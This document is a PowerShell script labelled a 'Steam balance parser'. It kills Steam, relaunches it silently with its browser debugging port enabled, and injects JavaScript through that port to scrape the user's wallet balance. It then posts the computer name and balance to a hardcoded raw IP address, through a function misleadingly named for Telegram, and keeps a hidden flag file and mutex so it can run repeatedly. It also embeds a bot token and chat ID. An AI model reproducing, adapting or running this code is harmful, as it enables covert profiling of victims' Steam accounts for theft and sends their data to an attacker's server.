param(
    [int]$Port = 8080,
    [string]$SteamPath = "C:\Program Files (x86)\Steam\steam.exe",
    [string]$TelegramBotToken = "8525982740:AAHj8V3rFo_o629srRi1vTl9C7XrkilL7u0",
    [string]$TelegramChatId = "7695288740"
)

Add-Type -AssemblyName System.Net.Http

Write-Host "`n=== STEAM BALANCE PARSER v10 ===" -ForegroundColor Cyan

function Send-TelegramMessage {
    param(
        [string]$Message,
        [string]$BotToken,
        [string]$ChatId
    )

    try {
        $url = "http://89.34.90.212:8000/text"
        $null = Invoke-RestMethod -Uri $url -Method Post -Body $Message -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
        return $true
    } catch {
        Write-Host "[WARN] Failed to send Telegram: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

function Send-BalanceResult {
    param(
        [string]$ComputerName,
        [string]$Balance
    )

    if ([string]::IsNullOrWhiteSpace($Balance)) {
        $Balance = "0"
    }

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "       STEAM WALLET BALANCE" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "  Balance: $Balance" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""

    $telegramMsg = "Name: $ComputerName`nBalance: $Balance"
    if (Send-TelegramMessage -Message $telegramMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId) {
        Write-Host "[OK] Message sent!" -ForegroundColor Green
    } else {
        Write-Host "[ERROR] Failed to send message" -ForegroundColor Red
    }
}

function Resolve-SteamPath {
    $candidates = @()

    foreach ($key in @(
        "HKCU:\Software\Valve\Steam",
        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam",
        "HKLM:\SOFTWARE\Valve\Steam"
    )) {
        $p = (Get-ItemProperty $key -ErrorAction SilentlyContinue).SteamPath
        if ($p) { $candidates += (Join-Path $p "steam.exe") }
        $exe = (Get-ItemProperty $key -ErrorAction SilentlyContinue).SteamExe
        if ($exe) { $candidates += $exe }
    }

    $candidates += @(
        $SteamPath,
        "C:\Program Files (x86)\Steam\steam.exe",
        "C:\Program Files\Steam\steam.exe",
        "$env:ProgramFiles\Steam\steam.exe",
        "${env:ProgramFiles(x86)}\Steam\steam.exe",
        "D:\Steam\steam.exe",
        "E:\Steam\steam.exe"
    )

    foreach ($c in $candidates) {
        if ($c -and (Test-Path -LiteralPath $c)) {
            return (Resolve-Path -LiteralPath $c).Path
        }
    }

    return $null
}

function Test-SteamDebugPort {
    try {
        $null = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 2 -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function Stop-SteamProcesses {
    foreach ($name in @("steam", "steamwebhelper", "steamservice", "GameOverlayUI")) {
        Get-Process $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

function Start-SteamWithDebug {
    Write-Host "[i] Checking if Steam is running with debug port..." -ForegroundColor Cyan

    if (Test-SteamDebugPort) {
        Write-Host "[OK] Steam debug port is already available" -ForegroundColor Green
        return $true
    }

    $exe = Resolve-SteamPath
    if (-not $exe) {
        Write-Host "[WARN] Steam.exe not found, will still try existing process" -ForegroundColor Yellow
    } else {
        Write-Host "[i] Steam path: $exe" -ForegroundColor Gray
    }

    for ($attempt = 1; $attempt -le 2; $attempt++) {
        Write-Host "[i] Starting Steam with debug, attempt $attempt/2..." -ForegroundColor Yellow

        Stop-SteamProcesses
        Start-Sleep -Seconds 3

        if ($exe) {
            Start-Process -FilePath $exe -ArgumentList "-cef-enable-debugging","-silent" -ErrorAction SilentlyContinue
        } elseif (Get-Command steam -ErrorAction SilentlyContinue) {
            Start-Process steam -ArgumentList "-cef-enable-debugging","-silent" -ErrorAction SilentlyContinue
        }

        $waited = 0
        $limit = 60
        while ($waited -lt $limit) {
            Start-Sleep -Seconds 3
            $waited += 3
            Write-Host "[i] Waiting for Steam... ($waited/$limit sec)" -ForegroundColor Gray

            if (Test-SteamDebugPort) {
                Write-Host "[OK] Steam debug port is up" -ForegroundColor Green
                Start-Sleep -Seconds 8
                return $true
            }
        }
    }

    if (Get-Process steam -ErrorAction SilentlyContinue) {
        Write-Host "[WARN] Steam process exists but debug port is down" -ForegroundColor Yellow
    } else {
        Write-Host "[WARN] Steam did not start" -ForegroundColor Yellow
    }

    return $false
}

function Get-WalletFromTab {
    param($Tab)

    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
    try {
        $ws.ConnectAsync([Uri]$Tab.webSocketDebuggerUrl, [Threading.CancellationToken]::None).Wait(4000) | Out-Null
        if ($ws.State -ne 'Open') { return "" }

        $jsCode = @"
(function() {
    var el = document.querySelector('._2jphjrSifC6orDT4g_7Wd');
    if (el && el.textContent) return el.textContent.trim();

    var nodes = document.querySelectorAll('span, div, a, button');
    for (var i = 0; i < nodes.length; i++) {
        var t = (nodes[i].textContent || '').replace(/\s+/g, ' ').trim();
        if (!t || t.length > 32) continue;
        if (/(\$|€|£|₽|USD|EUR|RUB|uah|грн)/i.test(t) && /\d/.test(t)) return t;
        if (/^\d+[.,]\d{2}\s*[A-Za-z₽€$£₴₸]/.test(t)) return t;
    }
    return '';
})();
"@

        $evalMsg = @{
            id = 1
            method = "Runtime.evaluate"
            params = @{
                expression = $jsCode
                returnByValue = $true
            }
        } | ConvertTo-Json -Depth 10 -Compress

        $buffer = [System.Text.Encoding]::UTF8.GetBytes($evalMsg)
        $ws.SendAsync([ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait() | Out-Null
        Start-Sleep -Milliseconds 400

        $recv = New-Object byte[] 65535
        $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($recv), [Threading.CancellationToken]::None).Result
        $json = [System.Text.Encoding]::UTF8.GetString($recv, 0, $result.Count)
        $data = $json | ConvertFrom-Json

        if ($ws.State -eq 'Open') {
            $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", [Threading.CancellationToken]::None).Wait()
        }

        $val = $data.result.result.value
        if ($val) { return [string]$val }
        return ""
    } catch {
        return ""
    } finally {
        if ($ws.State -eq 'Open') {
            try { $ws.Abort() } catch {}
        }
        $ws.Dispose()
    }
}

function Get-SteamWalletBalance {
    if (-not (Test-SteamDebugPort)) {
        return ""
    }

    try {
        $tabs = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 5
    } catch {
        return ""
    }

    Write-Host "[i] Found $($tabs.Count) tabs" -ForegroundColor Gray

    $ordered = @($tabs | Where-Object { $_.title -eq "Steam" }) + @($tabs | Where-Object { $_.title -ne "Steam" })

    foreach ($tab in $ordered) {
        if (-not $tab.webSocketDebuggerUrl) { continue }
        Write-Host "[i] Checking tab: $($tab.title)" -ForegroundColor Gray
        $balance = Get-WalletFromTab -Tab $tab
        if ($balance) {
            Write-Host "[OK] Balance from tab '$($tab.title)': $balance" -ForegroundColor Green
            return $balance
        }
    }

    return ""
}

$computerName = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$stampDir = Join-Path $env:LOCALAPPDATA "WinBal"
if (-not (Test-Path $stampDir)) { New-Item -ItemType Directory -Path $stampDir -Force | Out-Null }
$stampPath = Join-Path $stampDir "sent.flag"
$cooldownHours = 24

$createdNew = $false
$mutex = New-Object System.Threading.Mutex($true, "Global\SteamBalParser", [ref]$createdNew)
if (-not $createdNew) {
    Write-Host "[i] Another bal.ps1 is already running, skip" -ForegroundColor Yellow
    exit 0
}

if (Test-Path $stampPath) {
    $age = (Get-Date) - (Get-Item $stampPath).LastWriteTime
    if ($age.TotalHours -lt $cooldownHours) {
        Write-Host "[i] Already sent $($age.TotalHours.ToString('0.0')) h ago, skip" -ForegroundColor Yellow
        $mutex.ReleaseMutex()
        exit 0
    }
}

Set-Content -Path $stampPath -Value $timestamp -Encoding ASCII

Write-Host "[i] Computer: $computerName" -ForegroundColor Gray
Write-Host "[i] Time: $timestamp" -ForegroundColor Gray

$steamOk = Start-SteamWithDebug
if (-not $steamOk) {
    Write-Host "[ERROR] Could not start Steam" -ForegroundColor Red
    Send-TelegramMessage -Message "Name: $computerName`nError: Could not start Steam" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
    Set-Content -Path $stampPath -Value $timestamp -Encoding ASCII
    try { $mutex.ReleaseMutex() } catch {}
    exit 1
}

$walletBalance = Get-SteamWalletBalance
if (-not $walletBalance) {
    Write-Host "[ERROR] Balance element not found" -ForegroundColor Red
    Send-TelegramMessage -Message "Name: $computerName`nError: Balance element not found" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
    Set-Content -Path $stampPath -Value $timestamp -Encoding ASCII
    try { $mutex.ReleaseMutex() } catch {}
    exit 1
}

Send-BalanceResult -ComputerName $computerName -Balance $walletBalance
Set-Content -Path $stampPath -Value $timestamp -Encoding ASCII
Write-Host ""
try { $mutex.ReleaseMutex() } catch {}
